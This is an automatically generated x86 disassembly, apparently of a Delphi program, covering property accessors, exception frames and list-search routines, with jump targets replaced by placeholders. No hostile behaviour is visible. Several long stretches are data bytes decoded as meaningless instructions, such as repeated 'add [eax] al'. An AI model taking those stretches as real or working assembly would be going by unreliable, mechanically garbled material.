cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_415563 ]
jmp [ eax * 4 + jump_table_4154d0 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_4155f8
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_4155e4
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_415638
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4155e4
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_415678
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_4156b8
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4156f0
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_415718
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_415754
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_40594c
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_4157d4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_40594c
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415848
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41588e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415895
retn
mov eax rw-data
call sub_404038
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404aec
sub_4158c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4158e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4158ec
retn
sub_416209
in eax 0x61
inc ecx
add bl dh
popad
inc ecx
add ch bh
popad
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
or [ edx + 0x41 ] esp
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x62840040 ] cl
inc ecx
add [ 0x4162 ] dl
add [ eax ] al
add [ edx + 0x62c00041 ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xc004162 ] ah
add [ eax ] al
add [ eax + 0x61 ] cl
inc ecx
add al dh
xor al 0x40
add al cl
nop
inc ecx
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al bh
mov es [ ecx ]
or [ eax - 0x6fefffbf ] dl
inc ecx
add [ edi + ecx * 4 ] ah
inc ecx
add [ eax - 0x6f ] bl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] ah
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
mov al 0x10
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
xor al 0x40
add [ eax + 0x32 ] al
inc eax
imul esi [ ebx + 0x74 ] 0xc0746e65
bound eax [ ecx ]
pop es
adc eax 0x746e4954
jb r-xdata
add [ edx + esi + 0x40 ] bl
add ah cl
xchg edx eax
inc ecx
add [ edi ] al
push esp
push edx
arpl [ gs : ecx + 0x6c ] sp
insb
mov [ ebx + 0x41 ] fs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
arpl [ ecx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx * 4 + 0x41 ] ah
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add [ edi + ecx * 4 ] ah
inc ecx
add al dl
xchg ebx eax
inc ecx
add [ eax - 0x1fffbe6c ] dh
xchg esp eax
inc ecx
add al bl
xchg esp eax
inc ecx
add [ ebx + edx * 4 ] ch
inc ecx
add [ edx ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ebx + 0x41 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x63ba0041 ] ch
inc ecx
add [ eax + eax ] cl
add [ eax ] al
dec eax
popad
imul esi [ ebx + 0x74 ] 0x84746e65
bound eax [ ecx ]
mov esp 0x4161
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
lodsb [ esi ]
arpl [ ecx ] ax
mov edx 0xc004163
add [ eax ] al
add [ eax + 0x61 ] cl
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx + 0x41 ] ah
add [ eax + eax ] cl
add [ eax ] al
sub_416bed
imul eax [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6c ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
insd
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x1fffbe46 ] bh
mov edx 0x2aa80041
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
push es
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x416d7c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 2 + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh 0x6d
inc ecx
add [ eax + eax ] bh
jb r-xdata
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ecx + edx + 0x34f00040 ] ah
inc eax
add [ ecx + ebx * 2 + 0x59c00040 ] dh
inc eax
add [ esi + 0x34f80040 ] al
inc eax
add al dl
pop ecx
inc eax
add [ edx + esi + 0x40 ] bl
add [ edx + ebx + 0x1ad40042 ] bl
inc edx
add [ ebx + ebx ] bh
inc edx
add [ ebx + ebx + 0x1c280042 ] ah
inc edx
add [ esp + ebx + 0x1e8c0042 ] cl
inc edx
add [ eax - 0x5bffbde2 ] bl
push ds
inc edx
add [ eax - 0x43ffbde2 ] dh
push ds
inc edx
add [ eax ] bh
pop ds
inc edx
add [ esi ] cl
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
insb
mov esp 0x416c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0x80041 ] bh
add [ eax ] al
mov al 0x10
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xc00417c ] ch
push esp
inc ebx
insb
popad
jae r-xdata
add ah cl
insb
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x3f ] bh
inc ecx
add al ah
mov edx 0xc1d80041
inc ecx
add [ edx + eax * 8 ] cl
inc ecx
add [ eax ] ah
lds eax [ ecx ]
cld
retn 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
insd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7c00416d ] dh
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ eax ] bl
insd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_416e16
inc ecx
add [ eax - 0x16 ] cl
inc ecx
add [ eax ] bh
out dx al
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2c0040 ] dl
add [ eax ] al
pop es
push esp
push edi
jb r-xdata
dec esi
je r-xdata
inc esp
and al 0x4
aam 0xe9
and ebp [ eax - 0x1a340000 ]
outsb
inc ecx
add bl dh
outsb
inc ecx
add ch bh
outsb
inc ecx
add ch bl
outsb
inc ecx
add [ edi ] al
outsd
inc ecx
add [ 0x1f00416f ] dl
outsd
inc ecx
add [ edx ] al
jns r-xdata
outsb
jb r-xdata
rcr al 0xe9
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e82835
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
test al 0x6e
inc ecx
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ esi + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
outsb
inc ecx
add [ eax + eax ] cl
add ah cl
insb
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ecx + ebp * 8 - 0x1573ffbf ] ch
inc ecx
add ah ah
jmp 0xffffffffea4d6e57
ror [ eax + 0x416e ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ esi + 0x41 ] ch
add [ eax + eax ] cl
add [ eax ] al
test al 0x72
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x7004032 ] bl
inc ebp
push esp
push 0x64616572
xchg esp eax
outsb
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
je r-xdata
outsb
outsb
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
xchg [ eax + 0x44830000 ] ebp
and al 0x4
fmul [ ebx - 0x74fbdbbc ]
dec [ ebx - 0x3f7c3340 ]
fsubr st1
add bh bh
pop ebp
retn 0x4
sub_41725c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406148
pop edi
pop esi
pop ebx
retn
sub_417298
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40612c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4172c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406150
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_417300
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x24004173 ]
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ esi * 2 + 0x54090041 ] al
nop
jne r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add al 0x89
add al 0x24
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + edi * 2 ] ch
inc ecx
add [ edx ] cl
push esp
push edx
inc edi
jb r-xdata
mov eax eax
mov al [ 0x4173 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004173 ] ah
xor esi esi
mov edx ebx
mov eax edi
call sub_4173b8
mov esi eax
jmp r-xdata
push edx
inc edi
jb r-xdata
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
add al 0x75
inc ecx
add [ ecx ] cl
push esp
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4173b8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4188d4
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4034d4
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4034d4
test al al
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4034d4
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4173b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4188d4
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4034d4
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4034d4
test al al
je r-xdata
sub_417418
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4173b8
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4173b8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4034d4
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417488
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403278
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_418778
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_417504
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
mov eax [ esi + 0x4 ]
call sub_4032a8
mov eax [ esi + 0x8 ]
call sub_4032a8
mov eax [ esi + 0xc ]
call sub_4032a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_417544
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4188d4
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_40320c
test al al
jne r-xdata
sub_4175a4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4188d4
mov edx eax
mov eax ebp
call sub_4034d4
test al al
jne r-xdata
sub_4175e8
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417683
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031f8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40429c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_417544
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41768a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
sub_4176a8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_4052b8
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4176c8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4188d4
mov edx edi
call sub_4176a8
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4188d4
mov edx edi
call sub_4176a8
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4187c4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_4176a8
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4187c4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_41776c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4188d4
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_4175a4
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_4177b8
push ebx
push esi
push edi
